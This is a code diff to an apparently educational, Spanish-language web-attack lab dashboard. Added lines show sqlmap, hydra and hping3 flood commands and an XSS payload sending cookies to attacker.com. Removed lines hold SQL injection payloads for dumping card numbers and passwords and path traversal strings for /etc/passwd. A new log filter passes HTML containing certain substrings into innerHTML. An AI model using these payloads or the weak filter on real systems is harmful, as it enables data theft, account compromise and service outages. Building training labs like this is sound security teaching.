@@ -45,11 +45,11 @@
     .t-out {
         background: #0a0a0a;
         padding: 24px;
-        height: 500px;
+        height: 650px;
         overflow-y: auto;
         color: #4ade80;
         font-family: 'Fira Code', monospace;
-        font-size: 0.85rem;
+        font-size: 0.9rem;
         line-height: 1.6;
     }
 
@@ -356,28 +356,6 @@
                         <p>Ataque de Diccionario (Admin)</p>
                     </div>
                 </div>
-                <div class="module-card" onclick="loadModule('lfi', this)">
-                    <div class="icon-wrap"><svg class="icon">
-                            <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path>
-                            <polyline points="13 2 13 9 20 9"></polyline>
-                        </svg></div>
-                    <div class="module-card-text">
-                        <h4>LFI / Path Traversal</h4>
-                        <p>Lectura de Archivos del Sistema</p>
-                    </div>
-                </div>
-                <div class="module-card" onclick="loadModule('idor', this)">
-                    <div class="icon-wrap"><svg class="icon">
-                            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
-                            <circle cx="9" cy="7" r="4"></circle>
-                            <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
-                            <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
-                        </svg></div>
-                    <div class="module-card-text">
-                        <h4>IDOR + BOLA</h4>
-                        <p>Autorización de Objetos Rota</p>
-                    </div>
-                </div>
                 <div class="module-card" onclick="loadModule('xss', this)">
                     <div class="icon-wrap"><svg class="icon">
                             <polyline points="16 18 22 12 16 6"></polyline>
@@ -415,8 +393,8 @@
                     style="margin-left:12px; font-size:0.6rem; color:#444; font-weight:800; text-transform:uppercase; font-family:sans-serif;">bash
                     — audit-v4.8</span>
             </div>
-            <div style="display:grid; grid-template-columns: 1fr 280px; flex:1;">
-                <div id="t-out" class="t-out" style="height:550px;">
+            <div style="display:grid; grid-template-columns: 1fr 380px; flex:1;">
+                <div id="t-out" class="t-out" style="height:650px;">
                     <div class="t-line-cyan">Sofia Solutions Audit Framework inicializado.</div>
                     <div class="t-line-dim">Esperando selección de módulo...</div>
                     <div id="t-cursor" class="t-cursor"></div>
@@ -475,14 +453,7 @@
                     <option value="/api/autenticacion/login/vulnerable">Login Inseguro (v1)</option>
                     <option value="/api/autenticacion/login/v2">Login Seguro (v2 + MFA)</option>
                  </select>
-                 <label class="cfg-label">PAYLOAD (Avanzado)</label>
-                 <select class="cfg-input" id="sqli-payload">
-                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico (' OR '1'='1'--)</option>
-                    <option value="admin'--">Bypass: Admin Login Bypass (admin'--)</option>
-                    <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
-                    <option value="' UNION SELECT 'bank', iban, cc_number FROM customer_billing--">Union: Exfiltrar Datos Bancarios (PII)</option>
-                    <option value="' UNION SELECT 'credentials', email, password FROM users--">Union: Exfiltrar Contraseñas de Usuarios</option>
-                 </select>`,
+`,
             run: runSQLi
         },
         brute: {
@@ -499,26 +470,6 @@
                  <label class="cfg-label">USUARIO OBJETIVO</label>
                  <input class="cfg-input" id="brute-user" value="admin@sofia.local">`,
             run: runBrute
-        },
-        lfi: {
-            title: 'LFI / Path Traversal',
-            config: `<label class="cfg-label">ARCHIVO OBJETIVO</label>
-                 <select class="cfg-input" id="lfi-file">
-                    <option value="../../../../../../../etc/hostname">/etc/hostname (Sistema)</option>
-                    <option value="../../../../../../../etc/passwd">/etc/passwd (Usuarios)</option>
-                    <option value="../../../../../../../var/www/html/index.php">index.php (Código Fuente)</option>
-                 </select>`,
-            run: runLFI
-        },
-        idor: {
-            title: 'IDOR',
-            config: `<label class="cfg-label">ID VÍCTIMA (Registro ajeno)</label>
-                 <select class="cfg-input" id="idor-id">
-                    <option value="1">Ticket #1 (Administración)</option>
-                    <option value="2">Ticket #2 (Iberdrola Privado)</option>
-                    <option value="4">Ticket #4 (Mercadona Crítico)</option>
-                 </select>`,
-            run: runIDOR
         },
         xss: {
             title: 'XSS Reflejado',
@@ -541,7 +492,20 @@
         const ts = new Date().toLocaleTimeString('es-ES', { hour12: false });
         const div = document.createElement('div');
         div.className = `t-line-${type}`;
-        div.innerHTML = `<span style="color:#222">[${ts}]</span> ${msg}`;
+        
+        const tsSpan = document.createElement('span');
+        tsSpan.style.color = '#222';
+        tsSpan.textContent = `[${ts}] `;
+        div.appendChild(tsSpan);
+        
+        const msgSpan = document.createElement('span');
+        if (msg.includes('<button') || msg.includes('<path')) {
+            msgSpan.innerHTML = msg; // Permitir botones de acción
+        } else {
+            msgSpan.textContent = msg; // Protege contra ejecución de scripts inyectados en el log
+        }
+        div.appendChild(msgSpan);
+        
         out.insertBefore(div, document.getElementById('t-cursor'));
         out.scrollTop = out.scrollHeight;
         return div;
@@ -550,6 +514,9 @@
     window.addEventListener('message', (e) => {
         if (e.data.type === 'XSS_SUCCESS') {
             showEvidence('XSS: Cookies & LocalStorage Robados', e.data.data);
+        }
+        if (e.data.type === 'PHISHING_SUCCESS') {
+            showEvidence('Phishing: Credenciales Capturadas', e.data.data);
         }
     });
 
@@ -591,8 +558,10 @@
     const delay = ms => new Promise(res => setTimeout(res, ms));
 
     async function runSQLi() {
-        const p = document.getElementById('sqli-payload').value;
+        const p = "' OR '1'='1'--";
         const ep = document.getElementById('sqli-ep').value;
+        tLog(`[COMMAND] sqlmap -u "${TARGET}${ep}" --data "email=${p}&password=x" --batch --dump`, 'yellow');
+        await delay(800);
         tLog(`sqlmap/1.8.2#dev - automatic SQL injection and database takeover tool`, 'cyan');
         tLog(`[INFO] testing connection to the target URL`, 'dim');
         await delay(400);
@@ -664,6 +633,8 @@
     async function runBrute() {
         const user = document.getElementById('brute-user').value;
         const ep = document.getElementById('brute-ep').value;
+        tLog(`[COMMAND] hydra -l ${user} -P rockyou.txt -s 80 ${window.location.hostname} http-post-form "${ep}:email=^USER^&password=^PASS^:F=Invalid"`, 'yellow');
+        await delay(800);
         tLog(`Hydra v9.3 (c) 2022 by van Hauser/THC`, 'cyan');
         tLog(`[DATA] max 16 tasks per 1 server, overall 16 tasks`, 'dim');
         tLog(`[DATA] attacking https://sofia-solutions.local${ep}`, 'dim');
@@ -713,6 +684,9 @@
 
     async function runXSS() {
         const action = document.getElementById('xss-action').value;
+        const payload = action === 'cookie' ? '<script>fetch("http://attacker.com/log?c="+document.cookie)<\/script>' : '<script>window.location.href="/phishing"<\/script>';
+        tLog(`[COMMAND] curl -G "${TARGET}/search" --data-urlencode "q=${payload}"`, 'yellow');
+        await delay(800);
         tLog(`[*] Lanzando ataque XSS Reflejado...`, 'yellow');
         await delay(600);
 
@@ -726,75 +700,20 @@
         } else {
             tLog(`[INFO] Inyectando payload iframe/redirect en el DOM...`, 'dim');
             await delay(600);
-            tLog(`[SUCCESS] Víctima interceptada por el portal de Phishing (Evilginx2)`, 'green');
-            addEvidence('Evil Proxy Activado', 'Target: https://login-sofia-solutions.attacker.com\nCredenciales capturadas:\nUser: admin@sofia.local\nPass: admin123', 'red');
+            tLog(`[SUCCESS] Víctima interceptada por el portal de Phishing (Evil Proxy)`, 'green');
+            addEvidence('Evil Proxy Activado', 'Target: https://sofia-solutions.local/phishing\nStatus: Intercepting session in real-time\nRedirection: ACTIVE', 'red');
             const res = tLog(`[*] Acción: `, 'cyan');
-            addAction(res, 'Ver credenciales robadas', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
-                alert("Simulación: Has exfiltrado con éxito las credenciales en texto plano desde el proxy inverso.");
+            addAction(res, 'Abrir Portal de Phishing', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
+                window.open('/phishing', '_blank');
             });
         }
     }
 
-    async function runLFI() {
-        const file = document.getElementById('lfi-file').value;
-        tLog(`[*] LFI: Intentando leer ${file}`, 'yellow');
-        await delay(800);
-        try {
-            // LFI directo al frontend PHP
-            const r = await fetch('/download.php?file=' + encodeURIComponent(file));
-            const txt = await r.text();
-            
-            if (r.ok && !txt.includes('Access Denied') && !txt.includes('Error: El archivo no existe')) {
-                tLog(`[+] Archivo exfiltrado con éxito.`, 'green');
-                const preview = txt.substring(0, 500) + (txt.length > 500 ? '\n[TRUNCATED FOR DISPLAY]' : '');
-                addEvidence('Sensitive File Content', preview);
-                
-                if (file.includes('passwd')) {
-                    tLog(`[INFO] Se han detectado hashes de contraseñas de sistema.`, 'cyan');
-                }
-            } else if (r.status === 403) {
-                tLog(`[-] Acceso denegado: El WAF ha bloqueado el Path Traversal.`, 'red');
-                addEvidence('LFI Blocked', 'El intento de lectura de archivos fuera del directorio permitido ha sido interceptado.', 'red');
-            } else {
-                tLog(`[-] Error: El archivo no es accesible o no existe en el contenedor.`, 'red');
-            }
-        } catch (e) {
-            tLog(`[CRITICAL] Error de red en el módulo LFI`, 'red');
-        }
-    }
-
-    async function runIDOR() {
-        const id = document.getElementById('idor-id').value;
-        tLog(`[*] IDOR: Accediendo a recurso ID ${id}`, 'yellow');
-        await delay(500);
-        
-        try {
-            const token = localStorage.getItem('sofia_token_CLIENT') || localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
-            
-            // Ataque real: Acceso a mensajes de un ticket sin validar propiedad
-            const r = await fetch(TARGET + '/api/tickets/' + id + '/messages', {
-                headers: { 'Authorization': `Bearer ${token}` }
-            });
-            
-            if (r.ok) {
-                const d = await r.json();
-                tLog(`[+] Acceso BOLA/IDOR exitoso. Datos recuperados.`, 'green');
-                addEvidence('BOLA/IDOR Data Stolen', JSON.stringify(d, null, 2));
-            } else if (r.status === 403) {
-                tLog(`[-] Acceso denegado: IDOR mitigado (Object Level Auth).`, 'red');
-                addEvidence('IDOR Blocked', 'El servidor ha validado la propiedad del recurso y ha denegado el acceso al ID ajeno.', 'red');
-            } else if (r.status === 401) {
-                tLog(`[-] Error: No hay una sesión activa para realizar el ataque.`, 'yellow');
-            } else {
-                tLog(`[-] Error en el acceso al recurso (IDOR Fallido).`, 'red');
-            }
-        } catch (e) {
-            tLog(`[CRITICAL] Error de red en IDOR`, 'red');
-        }
-    }
 
     async function runDoS() {
         const count = parseInt(document.getElementById('dos-count').value);
+        tLog(`[COMMAND] hping3 -c ${count} -d 120 -S -w 64 -p 80 --flood ${window.location.hostname}`, 'yellow');
+        await delay(800);
         tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones...`, 'red');
         let blocked = 0;
         for (let i = 0; i < count; i++) {
